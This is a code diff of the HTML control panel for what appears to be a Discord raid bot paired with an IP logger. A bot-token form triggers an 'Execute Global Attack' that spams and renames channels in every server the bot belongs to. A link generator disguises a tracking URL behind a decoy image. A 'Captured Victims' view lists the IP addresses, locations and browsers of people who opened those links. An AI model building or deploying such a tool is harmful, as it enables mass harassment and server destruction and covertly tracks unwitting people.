@@ -1,128 +1,110 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>ELITE GLOBAL | PANEL</title>
-    <script src="https://tailwindcss.com"></script>
-    <style>
-        @import url('https://googleapis.com');
-        body { background: #050505; font-family: 'Orbitron', sans-serif; color: #00ff41; }
-        .neon-border { border: 1px solid #ff003c; box-shadow: 0 0 15px #ff003c; }
-        .neon-text { text-shadow: 0 0 10px #ff003c; }
-        .btn-raid { background: linear-gradient(45deg, #ff003c, #7000ff); transition: 0.3s; }
-        .btn-raid:hover { transform: scale(1.02); box-shadow: 0 0 25px #ff003c; }
-        .glitch { animation: glitch 1s linear infinite; }
-        @keyframes glitch {
-            2%, 64% { transform: translate(2px,0) skew(0deg); }
-            4%, 60% { transform: translate(-2px,0) skew(0deg); }
-            62% { transform: translate(0,0) skew(5deg); }
-        }
-    </style>
+<meta charset="UTF-8">
+<title>ELITE CONTROL | RAID & LOGGER</title>
+<script src="https://tailwindcss.com"></script>
+<link href="https://googleapis.com" rel="stylesheet">
+<style>
+    body { background:#000; font-family:'Orbitron',sans-serif; color:#ff2a2a; }
+    .neon { text-shadow:0 0 8px #ff0000; }
+    .panel { background:#050505; border:1px solid #200; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
+    .input { background:#000; border:1px solid #300; color:#ff4444; outline:none; font-family: monospace; }
+    .input:focus { border-color: #f00; box-shadow: 0 0 10px #f00; }
+    .btn { background:linear-gradient(45deg,#500,#f00); transition: 0.2s; cursor:pointer; }
+    .btn:hover { transform: scale(1.01); box-shadow: 0 0 15px #f00; }
+    .tab-btn { padding:12px; cursor:pointer; opacity: 0.4; border-bottom: 2px solid transparent; font-size: 10px; }
+    .tab-btn.active { opacity: 1; border-color: #f00; text-shadow: 0 0 5px #f00; }
+    .tab { display:none; }
+    .tab.active { display:block; }
+</style>
 </head>
 <body class="p-4 md:p-10">
+<div class="max-w-5xl mx-auto">
+    <h1 class="text-4xl font-black neon mb-2 italic tracking-tighter">ELITE RAID BOT</h1>
+    <p class="text-[9px] mb-8 text-red-900 tracking-[0.4em]">CONNECTED TO: IDK-TOOL-PRODUCTION</p>
 
-    <div class="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-4 gap-6">
-        
-        <!-- SIDEBAR -->
-        <aside class="lg:col-span-1 space-y-6">
-            <div class="neon-border p-6 rounded-lg bg-black/80">
-                <h1 class="text-2xl font-black mb-2 glitch neon-text">ELITE v2</h1>
-                <p class="text-[10px] text-gray-500 uppercase tracking-widest mb-6">Global Raid System</p>
-                
-                <div class="space-y-4">
-                    <div class="p-3 bg-white/5 rounded border-l-4 border-red-600">
-                        <p class="text-xs font-bold">STATUS: <span class="text-red-500">READY</span></p>
-                    </div>
-                    <div class="p-3 bg-white/5 rounded border-l-4 border-indigo-600">
-                        <p class="text-xs font-bold text-indigo-400">GLOBAL AUTO-DETECT</p>
-                        <p class="text-[9px] text-gray-500">Ataca todos los servidores al mismo tiempo.</p>
-                    </div>
-                </div>
-            </div>
-
-            <div class="p-4 bg-red-900/10 border border-red-900/30 rounded text-[10px]">
-                <p class="font-bold text-red-500 mb-1 italic underline">MODO DE USO</p>
-                <p>1. Pega el Token del Bot.</p>
-                <p>2. Dale a INICIAR ATAQUE.</p>
-                <p>3. El bot nukeará todo donde esté metido.</p>
-            </div>
-        </aside>
-
-        <!-- MAIN PANEL -->
-        <main class="lg:col-span-3 space-y-6">
-            <div class="neon-border p-10 rounded-2xl bg-black/60 backdrop-blur-xl">
-                <h2 class="text-3xl font-black mb-8 italic tracking-tighter neon-text uppercase">Consola de Destrucción</h2>
-                
-                <div class="grid grid-cols-1 gap-6">
-                    <div>
-                        <label class="block text-[10px] text-gray-500 mb-2 font-bold">BOT TOKEN (EL ALMA DEL SISTEMA)</label>
-                        <input id="rToken" type="password" placeholder="TOKEN AQUÍ..." class="w-full bg-black/50 p-4 rounded border border-gray-800 focus:border-red-600 outline-none text-red-500 transition">
-                    </div>
-
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div>
-                            <label class="block text-[10px] text-gray-500 mb-2 font-bold">NOMBRE DE CANALES</label>
-                            <input id="rChan" type="text" placeholder="elite-was-here" class="w-full bg-black/50 p-4 rounded border border-gray-800 outline-none focus:border-indigo-500 transition">
-                        </div>
-                        <div>
-                            <label class="block text-[10px] text-gray-500 mb-2 font-bold">URL PROMOCIÓN (STREAMING)</label>
-                            <input id="rUrl" type="text" placeholder="https://mi-web.com" class="w-full bg-black/50 p-4 rounded border border-gray-800 outline-none text-indigo-400">
-                        </div>
-                    </div>
-
-                    <div>
-                        <label class="block text-[10px] text-gray-500 mb-2 font-bold">CARGA DE SPAM (@everyone + LAG)</label>
-                        <textarea id="rMsg" placeholder="Mensaje que saturará los servidores..." class="w-full bg-black/50 p-4 rounded border border-gray-800 h-32 outline-none focus:border-red-600 transition"></textarea>
-                    </div>
-
-                    <button onclick="globalRaid()" id="mainBtn" class="btn-raid w-full py-6 rounded-lg font-black text-2xl italic tracking-widest text-white shadow-2xl">
-                        INICIAR ATAQUE GLOBAL
-                    </button>
-                </div>
-            </div>
-
-            <!-- LOGGER CARD -->
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="p-6 bg-indigo-900/10 border border-indigo-900/40 rounded-xl">
-                    <h3 class="text-sm font-bold text-indigo-400 mb-4">📸 IMAGE LOGGER</h3>
-                    <input id="lName" type="text" placeholder="Nombre imagen" class="w-full bg-black p-3 rounded border border-gray-800 text-xs mb-3">
-                    <button onclick="gen()" class="w-full bg-indigo-600 p-2 rounded text-xs font-bold">GENERAR LINK</button>
-                    <p id="resL" class="mt-4 text-[9px] text-green-500 break-all bg-black p-2 rounded hidden"></p>
-                </div>
-            </div>
-        </main>
+    <div class="flex gap-4 mb-6 uppercase font-bold">
+        <div class="tab-btn active" onclick="tab('raid',this)">Raid Console</div>
+        <div class="tab-btn" onclick="tab('gen',this)">Link Gen</div>
+        <div class="tab-btn" onclick="tab('logs',this)">IP Logs</div>
     </div>
 
-    <script>
-        async function globalRaid() {
-            const btn = document.getElementById('mainBtn');
-            btn.innerHTML = "<span class='glitch text-red-500'>SISTEMA EN CURSO...</span>";
-            
-            const res = await fetch('/api/run-raid', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    token: document.getElementById('rToken').value,
-                    msg: document.getElementById('rMsg').value,
-                    channelName: document.getElementById('rChan').value,
-                    myWebsite: document.getElementById('rUrl').value
-                })
-            });
-            const data = await res.json();
-            if(data.success) {
-                alert("Raid iniciado en " + data.count + " servidores simultáneamente.");
-            }
-            btn.innerText = "INICIAR ATAQUE GLOBAL";
-        }
+    <!-- RAID -->
+    <div id="raid" class="tab active panel p-8 rounded-xl space-y-4">
+        <input id="rToken" type="password" placeholder="BOT TOKEN" class="input w-full p-4 rounded">
+        <div class="grid md:grid-cols-2 gap-4">
+            <input id="rChan" type="text" placeholder="CHANNELS NAME" class="input w-full p-4 rounded">
+            <div class="p-4 bg-red-900/10 border border-red-900/40 rounded text-[10px] flex items-center">
+                AUTO-STATUS: idk-tool-production.up.railway.app
+            </div>
+        </div>
+        <textarea id="rMsg" placeholder="SPAM PAYLOAD" class="input w-full p-4 rounded h-32"></textarea>
+        <button onclick="runRaid()" id="btnR" class="btn w-full py-5 rounded font-black text-white uppercase tracking-widest">Execute Global Attack</button>
+    </div>
 
-        function gen() {
-            const l = window.location.origin + "/image/" + (document.getElementById('lName').value || 'img') + ".png";
-            document.getElementById('resL').innerText = l;
-            document.getElementById('resL').classList.remove('hidden');
-        }
-    </script>
+    <!-- GENERATOR -->
+    <div id="gen" class="tab panel p-8 rounded-xl space-y-4 border-t-2 border-indigo-900">
+        <h2 class="text-indigo-500 font-bold text-sm uppercase">Image Logger Setup</h2>
+        <input id="lName" type="text" placeholder="URL Name (ej: foto_sorpresa)" class="input w-full p-3 rounded border-indigo-900">
+        <input id="lRealImg" type="text" placeholder="Target Real Image URL (Señuelo)" class="input w-full p-3 rounded border-indigo-900">
+        <button onclick="genLink()" class="w-full bg-indigo-900 py-3 rounded font-bold text-white uppercase text-xs">Generate Link</button>
+        <p id="resL" class="text-[10px] p-4 bg-black border border-indigo-900 text-indigo-400 break-all hidden"></p>
+    </div>
+
+    <!-- LOGS -->
+    <div id="logs" class="tab panel p-8 rounded-xl">
+        <div class="flex justify-between items-center mb-6 border-b border-red-900 pb-2">
+            <h2 class="text-sm neon uppercase font-bold">Captured Victims</h2>
+            <button onclick="updateLogs()" class="text-[9px] bg-red-950 px-3 py-1 rounded border border-red-800">REFRESH</button>
+        </div>
+        <div id="ipBox" class="space-y-3 h-96 overflow-y-auto pr-2"></div>
+    </div>
+</div>
+
+<script>
+function tab(id, el) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    el.classList.add('active');
+    if(id === 'logs') updateLogs();
+}
+
+async function runRaid() {
+    const btn = document.getElementById('btnR');
+    btn.innerText = "ATTACKING...";
+    const res = await fetch('/api/run-raid', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token: rToken.value, msg: rMsg.value, channelName: rChan.value })
+    });
+    const d = await res.json();
+    alert(d.success ? `Atacando ${d.count} servidores` : "Error en el Token");
+    btn.innerText = "EXECUTE GLOBAL ATTACK";
+}
+
+function genLink() {
+    const url = encodeURIComponent(document.getElementById('lRealImg').value);
+    const link = `${window.location.origin}/image/${document.getElementById('lName').value || 'img'}.png?url=${url}`;
+    document.getElementById('resL').innerText = link;
+    document.getElementById('resL').classList.remove('hidden');
+}
+
+async function updateLogs() {
+    const res = await fetch('/api/ip-logs');
+    const data = await res.json();
+    const box = document.getElementById('ipBox');
+    box.innerHTML = data.map(l => `
+        <div class="p-3 bg-white/5 rounded border-l-2 border-red-600 text-[10px]">
+            <div class="flex justify-between font-bold text-red-500 mb-1">
+                <span>IP: ${l.ip}</span> <span>${l.date}</span>
+            </div>
+            <div class="text-gray-400">LOC: ${l.geo}</div>
+            <div class="text-[8px] text-gray-600 truncate mt-1">${l.ua}</div>
+        </div>
+    `).join('') || "<p class='text-center text-gray-800 uppercase text-xs mt-10'>No victims found</p>";
+}
+</script>
 </body>
 </html>
-</body>
-</html>
-
